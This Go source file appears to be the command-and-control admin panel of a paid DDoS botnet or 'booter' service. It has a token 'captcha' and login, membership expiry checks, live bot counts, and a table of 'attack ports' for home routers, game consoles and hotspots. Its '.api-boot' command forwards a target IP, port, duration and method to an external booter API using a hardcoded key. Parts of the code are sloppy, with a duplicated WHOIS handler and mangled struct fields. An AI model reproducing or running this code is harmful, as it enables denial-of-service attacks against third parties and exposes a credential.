package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "io/ioutil"
    "strconv"
    "net/http"
	"encoding/json"
	
	
)
type GeoIP struct {
	Status     string `json:"status"`
	ry         string `json:"country"`
	ryCode     string `json:"countryCode"`
	Region     string `json:"region"`
	RegionName string `json:"regionName"`
	City       string `json:"city"`
	Zip        string `json:"zip"`
	Isp        string `json:"isp"`
	Org        string `json:"org"`
	AS         string `json:"as"`
	Timezone   string `json:"timezone"`
	Mobile     bool   `json:"mobile"`
	Proxy      bool   `json:"proxy"`
}
var (
	address  string
	err      error
	geo      GeoIP
	response *http.Response
	body     []byte
)
const purple string = "\033[1;35m"
const red string = "\033[0;35m"
const white string = "\033[01;37m"  
const cyan string = "\x1b[1;36m;1m"    // Bright Bloo
const grey string = "\033[00;00m"   // Default Colour
const yellow string = "\x1b[1;32m" // Bright Magenta
const green string = "\x1b[1;32m"   // Gween Colour
const blue string = "\u001b[34m"
const magenta string = "\033[01;31m"
const CC string = "The Net"            // Booternet Name


var ongoing_attacks int = 0
var pm string = ""
var userpm string = ""
var kicked string = ""
var kickedmessage string = ""
var sender string = ""
var kickall int = 0

type Admin struct {
    conn    net.Conn
}
var users_connected int = 0

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}

}
func MoveCursorYX(Ypos string, Xpos string) string{

	var MovedCursor = "\033[" + Ypos + ";" + Xpos + "H"
	return MovedCursor
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()


    //Captcha start
		this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;  Captcha\007"))); err != nil {
		this.conn.Close()
	}
	
	this.conn.Write([]byte(fmt.Sprintf("" + white + "Please Enter This Build's Token To Access " + red + "%s\r\n", CC)))
	this.conn.Write([]byte("\r\n"))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("" + red + "Captcha" + white + ": " + white + ""))
	token, err := this.ReadLine(true)
	if err != nil {
	return
	}
	if token != "!.!" { // Edit This or Keep It The Same lol CAPTCHA 
	this.conn.Write([]byte("Incorrect token bye...\r\n"))
	this.conn.SetDeadline(time.Now().Add(1 * time.Second))
			buf := make([]byte, 1)
        this.conn.Read(buf)
        return
	    }
        this.conn.Write([]byte("\033[2J\033[1H"))
    //Captcha end

    //Motd
    message, err := ioutil.ReadFile("MOTD.txt")
	if err != nil {
		return
	}
	motd := string(message)

      // Get username
	  	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; Type Username\007"))); err != nil {
		this.conn.Close()
	}
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[4;32mимя пользователя\033[0;91m: "))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
		this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; Type Password\007"))); err != nil {
		this.conn.Close()
	}
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[4;36mпароль\033[0;91m: "))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;  Wrong Credentials\007"))); err != nil {
		this.conn.Close()
	}
            time.Sleep(1 * time.Second)
            this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\r\n\033[0;37m[!] \033[0;32m%s \033[0;37myou have been logged.\r\n\r\n", username)))
				this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r\n"))
	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte(fmt.Sprintf("\r"+yellow+"ERROR: "+white+"Incorrect username or password ["+yellow+"!"+white+"]\r\n            "+yellow+"IP"+grey+": "+white+"("+green+"%s"+white+") "+yellow+"Has Been Logged"+white+"!", this.conn.RemoteAddr())))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
    }
    
          	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;  Successfully Logged In\007"))); err != nil {
		this.conn.Close()
	}  
	
			

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;91mпроверка учетных данных, пожалуйста, подождите.")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;92mпроверка учетных данных, пожалуйста, подождите..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;93mпроверка учетных данных, пожалуйста, подождите...")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;94mпроверка учетных данных, пожалуйста, подождите..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;95mпроверка учетных данных, пожалуйста, подождите.")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;96mпроверка учетных данных, пожалуйста, подождите..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;97mпроверка учетных данных, пожалуйста, подождите...")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;91mпроверка учетных данных, пожалуйста, подождите.")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;92mпроверка учетных данных, пожалуйста, подождите..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;93mпроверка учетных данных, пожалуйста, подождите...")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;94mпроверка учетных данных, пожалуйста, подождите..")))
    time.Sleep(time.Duration(300) * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(fmt.Sprintf("\033[0;95mпроверка учетных данных, пожалуйста, подождите."))) 
    this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[2J\033[1H"))
			    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[37;1m \033[35m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

	this.conn.Write([]byte(fmt.Sprintf("\033[01;36m  \033[1;32mHey  \033[01;32m | \033[1;31m" + username + " !          \r\n")))
	

	//membership
	user_day_max := database.FetchDay(username)
	user_month_max := database.FetchMonth(username)
	user_year_max := database.FetchYear(username)

	currentTime := time.Now()

	current_day_now := int(currentTime.Day())
	current_month_now := int(currentTime.Month())
	current_year_now := int(currentTime.Year())

	if current_year_now == user_year_max {

		if current_month_now == user_month_max {
			if current_day_now >= user_day_max {
				this.conn.Write([]byte(fmt.Sprintf("\rERROR: Your membership has already expired, please contact an administrator or reseller to renew it ")))
				this.conn.SetDeadline(time.Now().Add(60 * time.Second))
				buf := make([]byte, 1)
				this.conn.Read(buf)
				return
			}
		} else if current_month_now > user_month_max {
			this.conn.Write([]byte(fmt.Sprintf("\rERROR: Your membership has already expired, please contact an administrator or reseller to renew it ")))
			this.conn.SetDeadline(time.Now().Add(60 * time.Second))
			buf := make([]byte, 1)
			this.conn.Read(buf)
			return
		}
	} else if current_year_now > user_year_max {

		this.conn.Write([]byte(fmt.Sprintf("\rERROR: Your membership has already expired, please contact an administrator or reseller to renew it ")))
		this.conn.SetDeadline(time.Now().Add(60 * time.Second))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
    }
    is_connected := database.isConnected(username)

	if (is_connected){

		this.conn.Write([]byte("\r"+yellow+"ERROR: "+white+"User was already connected, logged into the database ["+yellow+"!"+white+"]\n            Sharing logins is prohibited and is a reason to get banned. \r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		
		this.conn.Write([]byte("\033[?1049l"))
		return;
	} else {
		users_connected += 1;
	}

    
    //Header display bots connected, source name, client name
    this.conn.Write([]byte("\r\n\033[0m"))
    database.setUserState(username, 1)
    this.conn.Write([]byte("Net loading up pls wait! \r\n"))
    this.conn.Write([]byte("\033]0;Net loading up pls wait! \007"))
	time.Sleep(5 * time.Second)
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
                      if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Loaded | Connected %d | %s | %s\007" , BotCount, users_connected, username, database.GetMessage()))); err != nil {
                this.conn.Close()
                database.setUserState(username, 0)

				users_connected -= 1;
                break
                
            }
            if !database.isConnected(username){
				users_connected -= 1;


				

			this.conn.Write([]byte("\r\n"))
				this.conn.Write([]byte("\033]0;You got kicked :(\007"))
				database.Kick(username)
				
				buf := make([]byte, 1)
				this.conn.Read(buf)
				this.conn.Close()				
				break
			}
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    
    this.conn.Write([]byte(fmt.Sprintf("\r\n\033[0;91m[!] вы вошли в систему %s\r\n\r\n", username)))

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[0;37m" + username + "\033[0;91m@\033[0;37mзапуск\033[0;91m:~\033[0;37m "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        
        if cmd == "" {
            continue
        }
        
if err != nil || cmd == "clear" || cmd == "cls" {
	        this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("                \033[91m██████\033[93m╗  \033[91m█████\033[93m╗ \033[91m████████\033[93m╗\033[91m██\033[93m╗  \033[91m██\033[93m╗\033[91m███████\033[93m╗\033[91m██\033[93m╗  \033[91m██\033[93m╗\r\n"))
            this.conn.Write([]byte("                \033[91m██\033[93m╔══\033[91m██\033[93m╗\033[91m██\033[93m╔══\033[91m██\033[93m╗╚══\033[91m██\033[93m╔══╝\033[91m██\033[93m║ \033[91m██\033[93m╔╝\033[91m██\033[93m╔════╝\033[91m██\033[93m║ \033[91m██\033[93m╔╝\r\n"))
            this.conn.Write([]byte("                \033[91m██████\033[93m╔╝\033[91m███████\033[93m║   \033[91m██\033[93m║   \033[91m█████\033[93m╔╝ \033[91m█████\033[93m╗  \033[91m█████\033[93m╔╝\r\n"))
            this.conn.Write([]byte("                \033[91m██\033[93m╔══\033[91m██\033[93m╗\033[91m██\033[93m╔══\033[91m██\033[93m║   \033[91m██\033[93m║   \033[91m██\033[93m╔═\033[91m██\033[93m╗ \033[91m██\033[93m╔══╝  \033[91m██\033[93m╔═\033[91m██\033[93m╗\r\n"))
            this.conn.Write([]byte("                \033[91m██████\033[93m╔╝\033[91m██\033[93m║  \033[91m██\033[93m║   \033[91m██\033[93m║   \033[91m██\033[93m║  \033[91m██\033[93m╗\033[91m███████\033[93m╗\033[91m██\033[93m║  \033[91m██\033[93m╗\r\n"))
            this.conn.Write([]byte("                \033[93m╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\r\n"))
            continue

        }
        if cmd == "help" || cmd == "HELP" || cmd == "?" { // display help menu
		                   this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[32;1m \033[36m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
		this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;  Help Menu!\007"))); err != nil {
		this.conn.Close()
	}
                       this.conn.Write([]byte(fmt.Sprintf("              "+ red +"MOTD"+white+": %s\r\n", motd)))
					   this.conn.Write([]byte(fmt.Sprintf("                Expiry date: %d / %d / %d \r\n", user_month_max, user_day_max, user_year_max)))
           			   this.conn.Write([]byte("\033[1;32m               -> ☢ Owner @ryanlpz9 ☢ <- \r\n"))
                       this.conn.Write([]byte("\033[01;31m     ╔══════════════════════════════════════╗   \033[0m \r\n"))
                       this.conn.Write([]byte("\033[01;32m     ║ \033[01;32mMETHODS -> \033[01;32mShows attack commands     \033[01;32m║   \033[0m \r\n"))
                       this.conn.Write([]byte("\033[01;33m     ║ \033[01;33mBOTS -> \033[01;33mShows bots and archs         \033[01;33m║   \033[0m \r\n"))
                       this.conn.Write([]byte("\033[01;34m     ║ \033[01;34mRULES -> \033[01;34mRules                       \033[01;34m║   \033[0m \r\n"))
					   this.conn.Write([]byte("\033[01;32m     ║ \033[01;32mPORTS -> \033[01;32mShows Ports To Attack With  \033[01;32m║   \033[0m \r\n"))
                       this.conn.Write([]byte("\033[01;35m     ║ \033[01;35mCLS -> \033[01;35mClears the terminal           \033[01;35m║   \033[0m \r\n"))
                       this.conn.Write([]byte("\033[01;36m     ║ \033[01;36mLOGOUT -> \033[01;36mExits from the terminal    \033[01;36m║   \033[0m \r\n"))
			           this.conn.Write([]byte("\033[01;33m     ║ \033[01;33mTOOLS -> \033[01;33mShows a list of tools       \033[01;33m║   \033[0m \r\n"))
					   this.conn.Write([]byte("\033[01;32m     ║ \033[01;32mEXTRA -> \033[01;32mShows extra commands        \033[01;32m║   \033[0m \r\n"))
			           this.conn.Write([]byte("\033[01;31m     ║ \033[01;31mBANNER -> \033[01;31mShows a list of banners    \033[01;31m║   \033[0m \r\n"))
			           this.conn.Write([]byte("\033[01;32m     ║ \033[01;32mOWNER  -> \033[01;32mShows Contact Page         \033[01;32m║   \033[0m \r\n"))
                       this.conn.Write([]byte("\033[01;37m     ╚══════════════════════════════════════╝ \033[0m \r\n"))
					   		this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;  Help Menu!\007"))); err != nil {
		this.conn.Close()
	}
        		continue
				}
						this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;  Tools Menu!\007"))); err != nil {
		this.conn.Close()
	}
				
        if err != nil || cmd == "TOOLS" || cmd == "tools" || cmd == "tool" { 
            this.conn.Write([]byte("\033[01;31m            ╔══════════════════════════════════╗ \r\n"))
            this.conn.Write([]byte("\033[01;32m            ║\033[01;32m PING         - Pings an IP      \033[01;32m ║\r\n"))
            this.conn.Write([]byte("\033[01;33m            ║\033[01;33m GEOIP        - Shows IP info    \033[01;33m ║\r\n"))
			this.conn.Write([]byte("\033[01;32m            ║\033[01;35m PORTSCAN      - Port Scanner    \033[01;32m ║\r\n"))
            this.conn.Write([]byte("\033[01;34m            ║\033[01;34m WHOIS       - Runs a WHOIS check\033[01;34m ║\r\n"))
            this.conn.Write([]byte("\033[01;35m            ║\033[01;35m TRACER    - Traceroute on IP    \033[01;35m ║\r\n"))
            this.conn.Write([]byte("\033[01;36m            ║\033[01;36m RESOLVE       - Resolves Domain \033[01;36m ║\r\n"))
            this.conn.Write([]byte("\033[1;95m            ║\033[01;37m REVDNS        - Shows DNS of IP \033[01;37m ║\r\n"))
            this.conn.Write([]byte("\033[01;38m            ║\033[01;38m ASNLOOKUP     - Shows ASN of IP \033[01;38m ║\r\n"))
			this.conn.Write([]byte("\033[01;32m            ║\033[01;39m ANALYTICS     - Analytics Lookup\033[01;32m ║\r\n"))
            this.conn.Write([]byte("\033[01;31m            ║\033[01;34m SUBCALC      - Calculates Subnet\033[01;31m ║\r\n"))
            this.conn.Write([]byte("\033[01;32m            ║\033[01;32m ZTRANSF     - Shows ZoneTransfer\033[01;32m ║\r\n"))
			this.conn.Write([]byte("\033[01;32m            ║\033[01;39m BANNERLOOKUP   - Banner Lookup  \033[01;32m ║\r\n"))
			this.conn.Write([]byte("\033[01;32m            ║\033[01;35m HIDDEN   - Link Scraping tool   \033[01;32m ║\r\n"))
            this.conn.Write([]byte("\033[01;33m            ╚══════════════════════════════════╝\r\n"))
            continue
        }
				this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;  Menu!\007"))); err != nil {
		this.conn.Close()
	}
		        if err != nil || cmd == "PORTS" || cmd == "ports" {
          this.conn.Write([]byte("\033[0;31m ╔════════════════════════════════════════════════════════════════════╗\r\n"))
          this.conn.Write([]byte("\033[0;36m ║\033[0;36m HOTSPOT PORTS:                     VERIZON 4G LTE:                 \033[0;36m║\r\n"))
          this.conn.Write([]byte("\033[0;34m ║\033[0;34m UDP - 1900                         UDP - 53, 123, 500, 4500, 52248 \033[0;34m║\r\n"))
          this.conn.Write([]byte("\033[0;32m ║\033[0;32m TCP - 2859, 5000                   TCP - 53                        \033[0;32m║\r\n"))
          this.conn.Write([]byte("\033[0;37m ║                                                                    \033[0;37m║\r\n"))
          this.conn.Write([]byte("\033[0;36m ║\033[0;36m AT&T Wi-Fi HOTSPOTS                ATTACK PORTS:                   \033[0;36m║\r\n"))
          this.conn.Write([]byte("\033[0;35m ║\033[0;35mUDP - 137, 138, 139, 445, 8053     699 Good For Hotspots            \033[0;35m║\r\n"))
          this.conn.Write([]byte("\033[0;34m ║\033[0;34mTCP - 1434, 8053, 8083, 8084       5060 Router Reset Port           \033[0;34m║\r\n"))
          this.conn.Write([]byte("\033[0;33m ║                                                                    \033[0;33m║\r\n"))
          this.conn.Write([]byte("\033[0;32m ║\033[0;32m STANDARD PORTS:                                                    \033[0;32m║\r\n"))
          this.conn.Write([]byte("\033[0;31m ║\033[0;31m HOME: 80, 53, 22, 8080                                             \033[0;31m║\r\n"))
          this.conn.Write([]byte("\033[0;32m ║\033[0;32m XBOX: 3074                                                         \033[0;32m║\r\n"))
          this.conn.Write([]byte("\033[0;33m ║\033[0;33m PS4: 9307                                                          \033[0;33m║\r\n"))
          this.conn.Write([]byte("\033[0;34m ║\033[0;34m PS3:                                                               \033[0;34m║\r\n"))
          this.conn.Write([]byte("\033[0;35m ║\033[0;35m   TCP:3478, 3479, 3480, 5223                                       \033[0;35m║\r\n"))
          this.conn.Write([]byte("\033[0;36m ║\033[0;36m   UDP:3478, 3479                                                   \033[0;36m║\r\n"))
          this.conn.Write([]byte("\033[0;37m ║\033[0;37m HOTSPOT: 9286                                                      \033[0;37m║\r\n"))
          this.conn.Write([]byte("\033[0;32m ║\033[0;32m VPN: 7777                                                          \033[0;32m║\r\n"))
          this.conn.Write([]byte("\033[0;34m ║\033[0;34m NFO: 1192                                                          \033[0;34m║\r\n"))
          this.conn.Write([]byte("\033[0;35m ║\033[0;35m OVH: 992                                                           \033[0;316m║\r\n"))
          this.conn.Write([]byte("\033[0;36m ║\033[0;36m HTTP: 80, 8080,443                                                \033[0;37m ║\r\n"))
          this.conn.Write([]byte("\033[0;37m ╚════════════════════════════════════════════════════════════════════╝\r\n"))
          continue
        }
		        if userInfo.admin == 0 && cmd == "info" || cmd == "INFO" {
			this.conn.Write([]byte(fmt.Sprintf("         Expiry date: %d / %d / %d \r\n", user_month_max, user_day_max, user_year_max)))
			this.conn.Write([]byte("         " + white + "Connected As Client" + white + ": \t" + grey + "" + username + "\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("         "+white+"Client IP Address"+white+": \t"+grey+"%s\r\n", this.conn.RemoteAddr())))
         continue
        }
		
        if err != nil || cmd == "RULES" || cmd == "rules" {
        botCount = clientList.Count()
		    this.conn.Write([]byte("\033[01;34m     -> | "+ username +" | <- \r\n"))
            this.conn.Write([]byte("\033[01;31m ╔═══════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[01;32m ║ \033[01;32mDon't spam! Don't share!          \033[01;31m║\r\n"))
            this.conn.Write([]byte("\033[01;33m ║ \033[01;33mDon't attack goverment ips.       \033[01;32m║ \r\n"))
            this.conn.Write([]byte("\033[01;34m ║ \033[01;34mVersion: \033[01;37mv1                       \033[01;33m║ \r\n"))
            this.conn.Write([]byte("\033[01;35m ╚═══════════════════════════════════╝  \r\n"))
            continue
        }
        if err != nil || cmd == "logout" || cmd == "LOGOUT" {
            return
        }
        
            if err != nil || cmd == "WHOIS" || cmd == "whois" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[96m: \r\n\x1b[96m" + locformatted + "\r\n"))
			            continue
        }
			if err != nil || cmd == "BANNERLOOKUP" || cmd == "bannerlookup" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/bannerlookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[96m: \r\n\x1b[96m" + locformatted + "\r\n"))
			            continue
        }
		if userInfo.admin == 1 && cmd == "-white" {//By ya boi Thar
			this.conn.Write([]byte("          IP: "))
			ip, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("         Mask (8-32): "))
			mask, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("         Are You Sure You Want To Whitelist " + ip + "? (y/n)"))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.AddWhitelist(ip, mask) {
				this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", "Failed to add Whitelist. An unknown error occured.\r\n")))
			} else {
				this.conn.Write([]byte("         Whitelist added successfully[!]\033[0m\r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && cmd == "-rwhitelist" {
			this.conn.Write([]byte("         IP: "))
			rm_WL, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("         Are You Sure You Want To Remove Whitelist On " + rm_WL + "?(y/n) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveWhitelist(rm_WL) {
				this.conn.Write([]byte(fmt.Sprintf("Unable to remove Whitelist\r\n")))
			} else {
				this.conn.Write([]byte("         Whitelist Successfully Removed[!]\r\n"))
			}
			continue
        }
        if err != nil || userInfo.admin == 1 && cmd == "-admin.bc" || userInfo.admin == 1 && cmd == "!bc" {
			this.conn.Write([]byte("Message: "))
			message, err := this.ReadLine(false)
			if err != nil {
				return
			}
			database.RemoveMessage()
			database.Broadcast(username, message)
			fmt.Println("[!]\033[01;31m " + username + " \x1b[1;36mChanged broadcast to: \033[01;31m" + message)
			this.conn.Write([]byte("Added !\x1b[0m\r\n"))
			continue
		}
			  if err != nil || cmd == "WHOIS" || cmd == "whois" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[96m: \r\n\x1b[96m" + locformatted + "\r\n"))
			            continue
        }
			if err != nil || cmd == "analytics" || cmd == "ANALYTICS" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/analyticslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[96m: \r\n\x1b[96m" + locformatted + "\r\n"))
            			            continue
        }
		        /////////////// API BOOTER
         if userInfo.admin == 0 && cmd == ".api-boot" || cmd == ".123" {
            this.conn.Write([]byte("\x1b[1;31mIP\x1b[1;35m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            this.conn.Write([]byte("\x1b[1;32mPort\x1b[1;33m: \x1b[0m"))
            port, err := this.ReadLine(false)
            this.conn.Write([]byte("\x1b[1;33mTime\x1b[1;31m: \x1b[0m"))
            timee, err := this.ReadLine(false)
            this.conn.Write([]byte("\x1b[1;34mMethod\x1b[1;36m: \x1b[0m"))
            method, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.stormbypass.xyz/vip-api.php?key=c9qod5ar5qtcv7g&host=" + locipaddress + "&port=" + port + "&time=" + timee + "&method=" + method
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[36mAPI is down. Contact Owner.\033[1;36mr\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32mError... IP Address Only!\033[1;32mr\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;32mServer Result\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
                        continue
            }
        // END OF API BOOTER

            if err != nil || cmd == "PING" || cmd == "ping" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[92m: \r\n\x1b[92m" + locformatted + "\r\n"))
            			            continue
        }
